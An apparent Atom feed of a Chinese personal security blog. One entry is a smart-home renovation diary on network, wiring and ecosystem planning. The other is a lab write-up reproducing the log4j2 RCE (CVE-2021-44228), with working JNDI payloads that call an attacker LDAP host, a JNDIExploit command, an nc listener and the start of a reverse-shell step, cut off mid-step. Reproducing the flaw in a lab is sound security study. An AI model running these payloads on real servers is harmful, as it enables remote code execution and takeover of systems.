<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>我的安全世界</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2024-11-25T15:03:57.252Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>LoongEyes</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>智能家居构建记录</title>
    <link href="http://yoursite.com/2024/06/19/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E6%9E%84%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2024/06/19/智能家居构建记录/</id>
    <published>2024-06-19T11:28:00.000Z</published>
    <updated>2024-11-25T15:03:57.252Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久好久，没有打开<code>hexo</code>了，离开信息安全行业已经一年有余了，这个博客最后一篇文章截至2021年，那一篇<code>log4j2 RCE</code>漏洞复现…</p><p>再次打开<code>hexo</code>，我已经忘记如何开启后台服务，也忘记了如何写<code>Markdown</code>，想想真的是可悲，人生总是有些出其不意，又有些无可奈何。</p><p>为什么要写这篇文章呢？今天（2024年6月19日）在研究<code>DDNS</code>如何实现时，想到了2018年跟随我入行信息安全的这个域名<code>loongeyes.cn</code>，想到了我这尘封许久的博客。转念一想，最近在研究如何在新房中实现智能家居，我何尝不将这个过程记录下来，原因有以下几点：</p><ol><li><p>一来是总结我的经验，供我以后参考。</p></li><li><p>二是如果有人还记得这个博客的话，能够为他人提供经验，我会感到非常高兴。</p></li><li><p>三是，多年以后，如果我翻出来这些文章，我想知道我当时是一种什么心情…哈哈……</p></li><li><p>还有一点，离开信息安全这个行业这么久，其实我已经差不多被这个行业所抛弃了，我现在唯一剩下的，也就是为了满足自己的生活、工作需求而有些动力去研究技术了，目前我所处的圈子，完全找不到志同道合的人。</p><p> 我希望，借此机会，能够静下心来研究我想研究的技术，多多少少找回之前的我…</p></li></ol><p>说了这么多，该步入正题了</p><h1 id="智能家居行业"><a href="#智能家居行业" class="headerlink" title="智能家居行业"></a>智能家居行业</h1><p>智能家居，是什么时间兴起的？我也不知道。可能是李克强总理提出“互联网+”的概念时，也可能是小米生态链的一步步构建时，还可能是<code>5G</code>的全面商用。社会的一步步发展，导致智能家居行业自然而然出生，逐步发展。我不想去探究这个问题，我只想在我的生活中，享受科技带来的乐趣。（果然，离开信息安全行业太久，我的信息安全意识有所下降，如果是之前，我宁愿保证安全，不愿意去冒险尝试有危机的新鲜科技事物，哈哈…）</p><h2 id="智能家居现状"><a href="#智能家居现状" class="headerlink" title="智能家居现状"></a>智能家居现状</h2><p>目前来看，经过我一段时间的了解，当前智能家居行业的现状是：以万物互联为核心，将家庭中的各类设备连接网络，实现通过语音、手机操控家庭中各类电器，从而实现一部分懒人效果。</p><p>那可操控的家庭内设备有哪些呢？其实主要就是，灯类、窗帘、各类家用电器（电视、冰箱、洗衣机、扫地机器人、晾衣架、净水器、空调、洗碗机、蒸烤箱…）、乃至汽车（特斯拉、小米…）</p><p>将这些设备集成到一种生态中，通过语音或者一个手机<code>APP</code>操控所有的可用电器，再通过配置自动化场景，实现不同行为执行不同的操作命令。这是网络上一些博主宣传智能家居的核心内容。</p><h2 id="我为什么要做智能家居"><a href="#我为什么要做智能家居" class="headerlink" title="我为什么要做智能家居"></a>我为什么要做智能家居</h2><p>很简单，因为我懒……哈哈哈哈哈</p><h2 id="智能家居未来设想"><a href="#智能家居未来设想" class="headerlink" title="智能家居未来设想"></a>智能家居未来设想</h2><p>多年以前，我就希望能够实现《钢铁侠》中贾维斯这个角色，当然，回归现实，这是一个必定会实现的事情，但并不是现在或者说五至十年内能够实现的。<code>ChatGPT</code>发布时，引起了轩然大波，这是人工智能行业中划时代的一次事件，多年以后，此事件必然会载入史册。</p><p>实现“贾维斯”，仍然是我希望做到的事（虽然，我应该什么也不会做…）</p><h1 id="我的智能家居"><a href="#我的智能家居" class="headerlink" title="我的智能家居"></a>我的智能家居</h1><p>回到现实，回到我本身，我将讲述一下我做智能家居的需求，以及我为之做的工作，并将此过程通过时间线的方式记录下来，这个过程应该会很长，可能持续装修至入住之后很长的一段时间，我希望能够坚持记录下来。</p><p>说来惭愧，我所有的想法都基于其他人已经实现的想法，我这人没有什么创新能力，一个做软件出身的计算机行业从业者，也没有自己做电器控制板的能力，就这样了。也许在以后的生活中，能够结合自己的生活冒出一些新奇的想法，那是以后的事情了。</p><h2 id="我的智能家居需求"><a href="#我的智能家居需求" class="headerlink" title="我的智能家居需求"></a>我的智能家居需求</h2><ol><li><p>实现灯光控制</p></li><li><p>实现窗帘控制</p></li><li><p>实现中央空调、扫地机器人、洗衣机等等家用电器的远程控制</p></li><li><p>根据自身需求，配置各类自动化场景，实现某些情景模式，比如回家模式、离家模式、观影模式、工作模式、游戏模式等等</p></li></ol><p>我的需求很简单，我并不需要实现什么“人来灯亮、人走灯灭”的场景，我觉得这是一个很奇怪的事情…</p><h2 id="智能家居生态选择"><a href="#智能家居生态选择" class="headerlink" title="智能家居生态选择"></a>智能家居生态选择</h2><p>现有的智能家居生态有很多很多，有大品牌，也有小厂商，有众所周知的，也有鲜为人知的，我不去完整的介绍各类智能家居生态，我也没有精力去了解这些，我只说些我知道的，和我所考虑的。</p><h3 id="Homekit"><a href="#Homekit" class="headerlink" title="Homekit"></a>Homekit</h3><p>苹果的智能家居生态，我是一个资深的苹果产品使用者，我大部分电子设备都是苹果产品。在购买一整套苹果设备之前（大概是2019、2020年时吧），我就在考虑生态的问题，为了体验，我购入了一套苹果设备。在真正进行智能家居构想落地之前，我曾经想做<code>Homekit</code>智能家居生态，但真正要落地之时，也就是近期吧，我觉得苹果的产品力一直在下降，反而国内以小米为核心的米家生态正在大跨步的崛起，虽然在平板电脑、笔记本电脑这些方面，苹果仍然是行业标杆，但在智能家居这个行业中，米家生态的多样性、可玩性要远远高于<code>Homekit</code>。</p><p>总结来看，<code>Homekit</code>生态闭塞，支持设备少，设备价格贵，而且，也许三年之后，我会抛弃苹果设备。</p><h3 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h3><p>华为，虽然他一直被推在民族大义的前沿，但作为一个消费者，华为的任何设备我都没有买过，原因很简单，性价比太低。</p><p>华为的智能家居生态，与<code>Homekit</code>基本一致，生态闭塞，可选择性少，性价比低，基本不具备可玩性。</p><h3 id="米家"><a href="#米家" class="headerlink" title="米家"></a>米家</h3><p>雷军是一个有些值得敬佩的人，从将智能手机的价格打下来，到布局并构建自己的智能家居生态，虽然在此之中，他并没有多么耀眼，但他所构建的庞大科技帝国是有目共睹的。</p><p>米家，性价比比其他生态要高，生态开放，有众多下游厂商，可接入各个家电行业部分智能设备，可玩性高，构建较其他简单。</p><h3 id="欧瑞博"><a href="#欧瑞博" class="headerlink" title="欧瑞博"></a>欧瑞博</h3><p>这个品牌，我从来没听说过，只是最近在逛红星美凯龙等家装城时，发现有这么一家做线下智能家居的品牌。大概了解了一下，品牌应该是挺大，但知名度有点低（只是对我自己来说啊），主要做全屋智能家居构建，包括网络构建。跟店里的导购聊了一下，感觉啥也不懂，像我这种有点想自己折腾的人来说，完全不合适，所以我不考虑。</p><h3 id="其他品牌"><a href="#其他品牌" class="headerlink" title="其他品牌"></a>其他品牌</h3><p>不了解了，也不想了解了…</p><p>说了这么多，很明显，我要做的智能家居生态，就是米家。</p><p>其实，我是想做<code>Homekit</code>与米家双兼容的生态，因为本身我目前是苹果用户，但米家生态可玩性更高，所以我想双兼容。经过思想斗争与对技术的了解，我决定，购买家装，以米家为主，后续可以通过其他手段进行双方融合。</p><h1 id="我的智能家居构建"><a href="#我的智能家居构建" class="headerlink" title="我的智能家居构建"></a>我的智能家居构建</h1><p>说了一堆，终于到重点了，我都写累了…</p><h3 id="2024年6月19日"><a href="#2024年6月19日" class="headerlink" title="2024年6月19日"></a>2024年6月19日</h3><p>刚刚交房两周，还没有开始动工。</p><p>动工的第一步就是砸墙，改水电。经过两周的构思，基本理清在哪留水、在哪留电、在哪布网。</p><p>水的事情其实还好，用水的地方其实并不多，而且开发商做的水基本问题不大。</p><p>电的事情比较多，因为家电众多，要整明白买什么家电，大概尺寸，才能知道电要放在哪个位置，放几个。这事，真的费脑子。</p><p>我先说网的事情吧，这个比较在行，而且，做智能家居，网络是必须的！</p><h4 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h4><p>弱电箱在主卧，开发商在每个房间布好了网络接口面板，并在电视背景墙、主卧布置了同轴电缆电视线。有这么几个问题：</p><ol><li><p>同轴电缆已经是被淘汰的技术了，目前家用电视已经不使用此传输介质</p></li><li><p>房子客厅开间7米，计划在客厅中部加书桌，需要网和电</p></li><li><p>餐厅、厨房位置网络覆盖较弱，需增加网口</p></li><li><p>开发商已经预埋网线，但是看着好low，我都没仔细看是几类网线…</p></li></ol><p>解决方案：</p><ol><li><p>目前，家庭网络架构，有什么<code>mash</code>组网，这个玩意又分有线组网、无线组网。价格还低，网上说是几百块钱就能解决。我不了解这个，因为要在家中不同位置放置路由器，实现信号全覆盖，说实话，很丑，做不到无感。还有就是<code>AC+AP</code>模式，这是大型企业的组网方式，在家庭中，有些浪费了，但好处是基本隐藏，缺点是价格贵，根据<code>AP</code>点位的多少，基本在两千块钱以上。</p><p> 这两种模式都需要预埋网线。</p><p> 我选择用<code>AC+AP</code>模式。</p></li><li><p>共设计6个<code>AP</code>点位，还有一个<code>IPTV</code>点位，即需要7条网线从弱电箱到相应的点位。具体点位给张图吧</p><p> <img src="/images/zhinengjiaju/1.JPG" alt="网络点位.JPG"></p><p> 红色星星是<code>AP</code>点位，橙色星星是<code>IPTV</code>点位</p><p> 基本做到了全屋网络覆盖，说实话，有些冗余，但是既要利用开发商已经做的点位，又要减少施工量，最终也就这结果了。其中餐厅、书桌为新加点位，其他位置均为开发商布线点位。</p><p> 各点位利用构想如下：</p><ol><li><p>电视背景墙<code>AP</code>点位：发射无线信号，网口用于后期智能家居中枢网关有线连接</p></li><li><p>电视背景墙<code>IPTV</code>点位：普通网络接口面板，提供一个网口，用于后期连接<code>IPTV</code>机顶盒</p></li><li><p>书桌<code>AP</code>点位：发射无线信号，网口后期可能用于<code>NAS</code>有线连接</p></li><li><p>其他点位：发射无线信号</p></li></ol></li><li><p>既然要做<code>AC+AP</code>模式，那就需要<code>AC</code>交换机，具备<code>POE</code>供电能力。还有<code>AP</code>面板，用于发射无线信号，并提供一个网口。</p><p> 买了<code>TP-LINK</code>品牌（家用可以了，要不我就买华三了）</p><p> 交换机型号是<code>TL-R479GPE-AC</code>，叫做<code>POE·AC一体化企业VPN路由器</code>。共九个网口，其中一个<code>WAN</code>口，八个<code>POE</code>供电<code>LAN</code>口。</p><p> <code>AP</code>面板型号是<code>TL-XAP3002GI-PoE</code>，一共6个。（一开始买了7个，后来发现电视背景墙<code>IPTV</code>点位只需要一根网线就行，不用发射无线信号，因为旁边有个<code>AP</code>面板，也不用供电，果断退了一个，直接省300元）</p><p> 1个<code>AC</code>+6个<code>AP</code>面板+1个普通网络接口面板，花费了2546.24元</p><p> <code>AC</code>交换机共九口，各口利用如下：</p><ol><li><p><code>WAN</code>口：连接光猫<code>LAN</code>口</p></li><li><p>6个<code>LAN</code>口：连接各<code>AP</code>点位</p></li><li><p>剩余2个<code>LAN</code>口：可用于<code>IPTV</code>，也可空余（光猫<code>IPTV</code>口不经过交换机，直接通过网线连接机顶盒也可）。浪费啊，为什么没有7口交换机！！</p></li></ol></li><li><p>预埋网线</p><p> 不知道开发商预埋的是几类网线，反正很low！</p><p> 自己买了超六类（是<code>CAT6A</code>！！！！！看了网上好多人被坑了，买了<code>CAT6E</code>，俗称假超六）网线，绿联的，双屏蔽双绞线。超六类线默认支持万兆网络（虽然现在也就用个300兆的网，用千兆就够了），因为家至少要住十年、二十年，为了以后网络提速，直接埋点好的吧。</p><p> 把开发商的线换成我自己的，同轴电缆扔到垃圾桶，换超六类网线。</p><p> 配套买了超六类水晶头20个，还有可以压五、超五、六、超六、七、八类网线的网线钳（已经预想到压网线把手干废了，这网线看着就硬）</p><p> 同时，买了烽火品牌的2芯3铜线的皮线光纤，跟网线一起穿到7个点位，这玩意，也许二十年之后能用上（那玩意叫<code>FTTR</code>，目前是运营商的噱头而已）</p><p> 其实埋网线这事我纠结了一晚上，是六类线还是超六类线，埋不埋光纤。最后想想，以现在的眼光看，还是最好一步到位吧，谁知道以后是什么情况呢，省的以后麻烦。哦，对了，上面的<code>AC+AP</code>都是千兆的，因为这玩意好换，网线是在地里的，不好换。</p><p> 网线、水晶头、网线钳、光纤花费704.76元</p></li><li><p>对了，换了弱电箱</p><p> 开发商的弱电箱属实小点，质量也不好，也不好看。买了公牛的弱电箱，自带插座，带分位模块。准备把光猫和交换机放弱电箱，需要电源。为了美观，需要布置好其中的位置。</p><p> 弱电箱花费106.77元</p></li></ol><p>行了，网络的事情，目前就是这样了，买了所有需要的东西，就等着开始改水电一起布线了，至于安装交换机和面板，等后期大概硬装大概结束再说吧。</p><p>好了，已经晚上十点半了，我累了，今天不写了，下次再说！</p><p>下次写对于电的构思、水的构思、智能家居的构思，如果已经开始动工了，那就也写一下。</p><hr><h3 id="2024年6月25日"><a href="#2024年6月25日" class="headerlink" title="2024年6月25日"></a>2024年6月25日</h3><p>隔了这么多天，才又继续写。这几天上班有些累了，没有劲头写这些，今晚没什么事情，就继续写一写吧。</p><p>上周末，中央空调安装结束。格力的中央空调，一拖五（客厅、书房、三个房间）。花费近三万…心疼至极。</p><p>昨天，开始动工改水电了，周天跟水电师傅交代了要做电和砸墙的点位。正好，在这说一下吧。</p><p>先说水吧，这个简单。</p><h4 id="水"><a href="#水" class="headerlink" title="水"></a>水</h4><p>开发商的水留的基本没有问题。</p><ol><li><p>厨房用水</p><p> 主要是水池用水，洗碗机用水，共用一套即可</p></li><li><p>阳台用水</p><p> 主要是洗衣机用水，扫地机器人用水。开发商在阳台已经预留两套上水。</p><p> 对于扫地机器人，最近在看，基本上就三个品牌，石头、云鲸、科沃斯。网上水军太多，我在纠结中….倒是也不着急，等做橱柜的时候再买也可以。哦，对了，这些牌子都自己干大了，基本都不能接入米家，当然，这不是个大事，肯定有技术手段能够实现统一控制的。</p></li><li><p>卫生间洗簌台用水</p><p> 上水没什么问题，下水满足洗漱台问题不大。</p><p> 我准备在客卫多安装一个小洗衣机（为未来的另一半准备的，虽然她现在在哪还不知道…）。所以，客卫的下水、上水要多接一套，需要用到三通。</p><p> 主卫、客卫下水做了墙排（除了好看，可能买啥作用）。刚刚跟我爸讨论了一下小洗衣机下水的事情，最终结论是，接三通（一接下水道，二接墙面排水，三接地漏），小洗衣机的下水接入地漏就行了。唯一的问题是，小洗衣机下水管会露在外面，这倒是也无所谓了。</p></li><li><p>淋浴用水</p><p> 开发商预留没问题。</p></li></ol><h4 id="电"><a href="#电" class="headerlink" title="电"></a>电</h4><p>电的问题就比较多了</p><ol><li><p>玄关</p><p> 玄关灯开关单开单控。</p><p> 鞋柜上方留一个插座。</p></li><li><p>客厅</p><ol><li><p>客厅主灯、客厅射灯、客厅灯带、走廊灯带共用一个四开单控。位于玄关西处北墙。</p><p> 射灯，天花板留电。</p><p> 灯带，留电。留至中央空调检修口。</p></li><li><p>电视背景墙，中部留插座两个，后期藏于电视柜内，同时预埋50管，用于电视上墙走线。</p><p> 原空调插座，保留，后期备用。</p><p> 客厅中央空调控制板留至电视背景墙。</p></li><li><p>客厅中部（即书房前侧）。南北居中留电源，用于书桌用电。南北分化两个插座，用于沙发周边使用。</p></li><li><p>书房后侧（即客厅西墙）。插座上移，用于书柜备用。</p><p> 原空调插座取消，改留电动窗帘电源。</p></li></ol></li><li><p>走廊</p><p> 天花板筒灯留电。</p><p> 书房中央空调控制板留至走廊墙面。</p></li><li><p>厨房</p><p> 厨房灯、书房灯共用双开单控。位于玄关西北墙，与客厅灯等四开单控放在一起。</p><p> 冰箱电，位于冰箱之上。</p><p> 油烟机电，油烟机位置北侧。</p><p> 蒸烤箱电，蒸烤箱位置北侧（<code>16A</code>）。</p><p> 燃气报警器电，燃气表附近。</p><p> 净水器、洗碗机电，水槽下方附近。</p></li><li><p>餐厅</p><p> 餐厅主灯、餐厅灯带、餐厅射灯共用一个三开单控，位于玄关西处北墙。与上方四开、双开放在一起。</p><p> 吊顶射灯，留电</p><p> 吊顶灯带，留电</p><p> 北墙窗户左右各留备用插座一个。</p><p> 西墙餐边柜，靠南侧，净水器管线机留电。靠北侧留电，后期加装轨道插座，用于各类小家电使用。</p></li></ol><ol start="6"><li><p>主卧</p><p> 床两侧，各留电源。南侧插座留高，用于梳妆台。</p><p> 床对面，留电。</p><p> 飘窗留电。</p><p> 两套电动窗帘留电。</p></li><li><p>次卧</p><p> 床两侧，留电。</p><p> 两套电动窗帘，留电。</p><p> 床对面，留电。</p></li><li><p>北卧</p><p> 书桌两侧，留电。</p><p> 东墙，留电。</p></li><li><p>阳台</p><p> 东墙，留电，用于茶桌。</p><p> 西墙。热水器、洗衣机、扫地机器人留电。</p><p> 天花板，留电。用于电动晾衣架。常通电，不设开关。</p></li><li><p>主卫</p><p>镜灯，留电。</p><p>洗簌台附近，留电，用于吹风机等。</p><p>智能马桶，留电。</p><p>天花板浴霸，留电。</p></li><li><p>客卫</p><p>镜灯，留电。</p><p>洗簌台附近，留电，用于吹风机等。</p><p>智能马桶，留电。</p><p>小洗衣机，留电。</p><p>天花板浴霸，留电。</p></li></ol><p>三个卧室灯光、阳台灯光均为单开单控。</p><p>客卫灯光单开单控，浴霸预留控制板。</p><p>主卫无单独灯，使用浴霸灯光，未预留控制板（购买可用于接入米家的浴霸，使用无线贴墙式开关）</p><p><strong>注：所有的开关预留零线，后期使用零火版智能开关，更加稳定。零线一定要用灯的零线，不能用插座的零线。</strong></p><p>因还未购买智能开关，从性价比来说，单开单控的智能开关性价比低于多开单控的智能开关。等购买智能开关时，再考虑更多场景，可能购买多开单控的智能开关，转为无线开关使用。</p><h4 id="近期考虑的其他问题"><a href="#近期考虑的其他问题" class="headerlink" title="近期考虑的其他问题"></a>近期考虑的其他问题</h4><ol><li><p>智能开关与智能灯的搭配问题</p><p> 如果比较极端，做到全屋智能，全屋可以一个开关都没有，全部通过传感器与语音进行控制。但我考虑此做法过于极端，不太符合现在的生活习惯，智能开关厂家都不推荐此做法，对于灯的重置问题只能通过拉电闸的方式，非常不方便，并且考虑到稳定性的问题，我还是决定保留物理开关，搭配语音使用。</p><p> 智能开关与智能灯是有适配问题的，智能开关控制电的通断，若智能开关断开，即物理链路断开，那手机、语音是无法进行灯光控制的。只有在智能开关打开，即物理链路打开的情况下，才能通过手机、语音控制。因保留物理开关与生活习惯的问题，不可避免会造成关闭物理开关，造成无法智能控制的问题（即智能灯掉线）。此问题有两个解决方案，一是取消开关，即上段所说的。二是，目前各大厂商针对这个问题，推出了凌动开关，凌动开关的原理是普通开关加装回弹功能和控制芯片，通过按下按键的瞬间发出脉冲电流去刺激灯具，灯具收到指令实现关灯和开灯，本身开关是处于不断电的状态的，不可用于控制普通灯具。但凌动开关有巨大的缺陷。</p><ol><li><p>凌动开关无法稳定支持多组灯具</p><p> 比如我的客厅射灯，由于需要调光调色，我必须使用智能灯，若选择凌动开关，会造成不同射灯开关不一致的问题，说白了，可能会造成一个射灯亮，其他不亮，再开一次开关的话，一个灯不亮，其他灯亮的问题。</p></li><li><p>凌动开关原理问题</p><p> 根据网络上所说，智能灯重置，大部分是短时间内多次开关实现的，使用凌动开关会导致误重置的情况发生。</p></li><li><p>凌动开关并不是支持所有的智能灯</p><p> 使用凌动开关，需智能灯具支持凌动功能。但，此类灯具极少。</p></li></ol><p>三是，绿米推出了火星技术，用于解决智能开关与智能灯的搭配问题，并推出了相应的智能开关，但绿米主要支持<code>Homekit</code>，并且价格较高。虽然可以通过技术手段完美解决生态的问题，但价格高仍是问题，所以此方案可作为备选方案。</p><p> 那，这个问题就无法解决了吗？并不是，网络上是有解决方案的。</p><ol><li><p>将智能灯相应开关转为无线开关，并设置自动化场景，实现物理开关控制灯具并保持灯具不掉线可智能控制。至于实现方式，等后期安装开关与灯具后再详细说明吧。</p></li><li><p>相应灯具放弃智能开关，使用普通开关，只控制电路的开合。后期使用时，此普通开关的处于常开状态，使用语音和手机进行智能控制。</p><p>这两个解决方案，目前来看都是有缺陷的，为了后期能够再考虑，我在分配开关时已经考虑到了这个问题。餐厅灯、餐厅灯带、餐厅射灯均为智能灯，可实现上述两种解决方案。至于其他两组开关，客厅主灯、客厅灯带、客厅射灯、走廊灯为一非智能、三智能，使用第一种解决方案；厨房灯、书房灯均为非智能灯，不存在此问题。</p></li></ol></li><li><p>大屏控制面板</p><p> 做智能家居，很多人想在家里放一个大屏控制板，看起来非常高大上。</p><p> 但，大屏幕的控制板价格虚高，所以，网上很多人推荐<code>86盒</code>式小屏幕控制板。但还有一个问题，小屏控制板通常搭配智能开关一体，有些还支持语音助手，但其支持的场景模式有限，显示的信息有限，语音助手智能化抵不上智能音箱。</p><p> 我目前的解决方案是，<code>ipad</code>上墙。通过<code>Home Assistant</code>（简称<code>HA</code>）实现多种生态、多种不同品牌家电的接入，统一显示在<code>ipad</code>屏幕中，并可实现多生态统一控制。</p><p> 要实现<code>ipad</code>上墙，并实现<code>ipad</code>自动充电。解决方案是，预留插座底盒，后期购买智能磁吸面板，搭配磁吸<code>ipad</code>外壳，接入<code>Homekit</code>，使用自动化实现充电功能。所以，我在玄关西处北墙多个开关上方，预留了插座底盒，用于<code>ipad</code>上墙.</p><p> 这里提到了<code>Home Assistant</code>（简称<code>HA</code>）。那就先简单介绍一下吧。（其实，这篇文章，最有技术的点就在于<code>Home Assistant</code>的配置，但这是装修完成后的事情了，后期再仔细介绍吧）</p><p> 先上张图吧，看看网络大神们做的接入与界面搭配。</p><p> <img src="/images/zhinengjiaju/2.jpeg" alt="Home Assistant.JPEG"></p><p> 这是百度找到的，感兴趣的话可以搜一下小红书，有很多大神发的教程。</p><p> 简单介绍一下吧，<code>Home Assistant</code>（简称<code>HA</code>）是一个开源的智能家居平台，可以运行在树莓派或者服务器上。<code>Home Assistant</code>把家中的智能家居设备整合到<code>HA</code>中，它能够接入的设备非常的多比如大名鼎鼎的小米、博联、易微联、飞利浦、特斯拉…，可以接入软件，然后让各个品牌之间的设备可以联网。</p><p> 好了，至于如何配置，我还没有研究，都等后期需要时再研究吧。</p></li><li><p>吊顶</p><p> 本来，为了不压层高，我们想吊一个高度8公分、宽度40公分的顶。与吊顶相关的，就是射灯和筒灯了。</p><p> 我想到了这个问题，因为我的射灯和筒灯需要是智能的（缓开缓灭、调光调色）。所以我提前看了射灯和筒灯。我发现，射灯通常高度在7公分以上，高的可能在8至9公分，那8公分的吊顶无法满足射灯的安装（还要考虑吊顶不平、预留电路管线高度问题）。筒灯的高度通常在4至5公分，这倒是没有什么问题。</p><p> 所以，我们更改了方案，决定吊一个高度10公分、宽度40公分的顶。</p></li></ol><p>今天到此结束了，已经凌晨了，通过写今天这一部分，又让我考虑到了很多之前没有考虑到的点，我也是一边在考虑一边在写，同时也一直在跟我爸交流，因为最近在改水电，我认为改水电是装修最重要的一步，能够多想到是最好的，当然，世界上的事情是没有绝对完美的，只是尽自己所能接近完美罢了。</p><p>再一次更新可能是很久以后了，也许我会更改之前写的内容，也可能会新增之前的内容。当然，我会标注更改的位置，毕竟，是第一次装修，很多想法会突如其然冒出来…哈哈</p><p>突然想起来一个事情，写了这么多，我还没有写关于智能家居无线协议的事情，这也是挑选智能设备很重要的一方面。（完了，搞技术的人忘了技术…）后期有时间在前面补上。</p><hr><h3 id="2024年11月25日"><a href="#2024年11月25日" class="headerlink" title="2024年11月25日"></a>2024年11月25日</h3><p>好久好久，又过了好久，上次打开这个博客还是6月份，时间过的这么快，现在已经是11月底了。</p><p>写到这里，我突然发现，之前写这篇博客的时候，是我当时心态出现问题的时候，至于为什么出现的问题，我不想说，这个世界上也许有一个人知道是为什么，但也许，那个人永远也看不到这篇博客。</p><p>今天，为什么突然又要写这篇博客，其实，实话实说，我最近的心态也非常的乱，包括工作，包括生活。最近遇到了很多很多的事情，我的心情很乱，我的理智告诉过我，我应该怎么做，但是，我没有办法不考虑我的感性。我是一个内心很纠结的人，同时我是一个不安于现状的人，在外人看来，我也许过的还不错，但其实，我觉得我马上要过完的人生的30%，简直过的一塌糊涂，工作并不是我满意的工作，生活也不是我满足的生活。我不知道我的出路在哪里。我的心很乱，我需要冷静，我需要找些其他的事情转移我的注意力，所以，我再次打开了这篇笔记。</p><p>写了这么多，</p><p>哈哈，一通朋友的电话打了一个多小时，也算是有人倾听了我的烦心事吧，我也倾听了他的烦心事，互相帮助互相鼓励吧。今天就不写了，已经晚上十一点多了，等有时间再来吧。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Apache log4j2 rce（CVE-2021-44228）</title>
    <link href="http://yoursite.com/2021/12/13/Apache-log4j2-rce%EF%BC%88CVE-2021-44228%EF%BC%89/"/>
    <id>http://yoursite.com/2021/12/13/Apache-log4j2-rce（CVE-2021-44228）/</id>
    <published>2021-12-13T11:18:00.000Z</published>
    <updated>2021-12-15T14:54:13.313Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>靶机地址：<code>10.211.55.8</code></p><p><code>CentOS</code>主机，安装<code>docker</code>，使用<code>docker</code>部署靶机环境</p><p>攻击机地址：<code>192.168.43.241</code></p><h2 id="配置靶机"><a href="#配置靶机" class="headerlink" title="配置靶机"></a>配置靶机</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09</span><br></pre></td></tr></table></figure><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -tid -p 38080:8080 vulfocus/log4j2-rce-2021-12-09</span><br></pre></td></tr></table></figure><p>将靶机的<code>8080</code>端口映射为<code>CentOS</code>主机的<code>38080</code>端口</p><p><img src="/images/CVE-2021-44228/1.png" alt="1.png"></p><p><img src="/images/CVE-2021-44228/2.png" alt="2.png"></p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>漏洞存在于<code>hello</code>目录下，直接请求此目录会产生如下提示</p><p><img src="/images/CVE-2021-44228/3.png" alt="3.png"></p><ol><li><p>使用<code>DNSLog</code>验证漏洞是否存在</p><p> <img src="/images/CVE-2021-44228/4.png" alt="4.png"></p></li><li><p>使用<code>hackbar</code>工具修改请求包</p><p> 漏洞利用的参数为<code>payload</code></p><p> 漏洞验证代码为<code>${jndi:ldap://xxx.dnslog/exp}</code></p><p> <img src="/images/CVE-2021-44228/5.png" alt="5.png"></p></li><li><p>漏洞验证结果</p><p> 请求结果</p><p> <img src="/images/CVE-2021-44228/6.png" alt="6.png"></p><p> <code>DNSLog</code>收到解析结果</p><p> <img src="/images/CVE-2021-44228/7.png" alt="7.png"></p></li></ol><p>证明漏洞存在</p><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>启动<code>JNDIExploit</code>工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.43.241</span><br></pre></td></tr></table></figure><p><img src="/images/CVE-2021-44228/8.png" alt="8.png"></p><h4 id="远程创建文件"><a href="#远程创建文件" class="headerlink" title="远程创建文件"></a>远程创建文件</h4><ol><li><p>首先进入<code>docker</code>靶机</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 7e12c /bin/bash</span><br></pre></td></tr></table></figure></li><li><p>查看<code>/tmp</code>目录下文件</p><p> <img src="/images/CVE-2021-44228/9.png" alt="9.png"></p></li><li><p>使用<code>BurpSuite</code>修改请求数据包并发送</p><p> 请求字段为<code>payload=${jndi:ldap://192.168.43.241:1389/TomcatBypass/Command/Base64/dG91Y2ggL3RtcC9hYWE%253d}</code></p><p> 其中<code>dG91Y2ggL3RtcC9hYWE%253d</code>为<code>touch /tmp/aaa</code>命令经过<code>base64</code>+两次<code>url</code>编码形成</p><p> <img src="/images/CVE-2021-44228/10.png" alt="10.png"></p></li><li><p>查看<code>JNDIExploit</code>工具</p><p> 发现已经有数据流量通过</p><p> <img src="/images/CVE-2021-44228/11.png" alt="11.png"></p></li><li><p>查看靶机<code>/tmp</code>目录</p><p> 发现已经成功创建<code>aaa</code>文件</p><p> <img src="/images/CVE-2021-44228/12.png" alt="12.png"></p></li></ol><h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><ol><li><p>攻击机使用<code>nc</code>开启<code>7777</code>端口的监听</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 7777</span><br></pre></td></tr></table></figure><p> <img src="/images/CVE-2021-44228/13.png" alt="13.png"></p></li><li><p>编写反弹<code>shell</code>命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 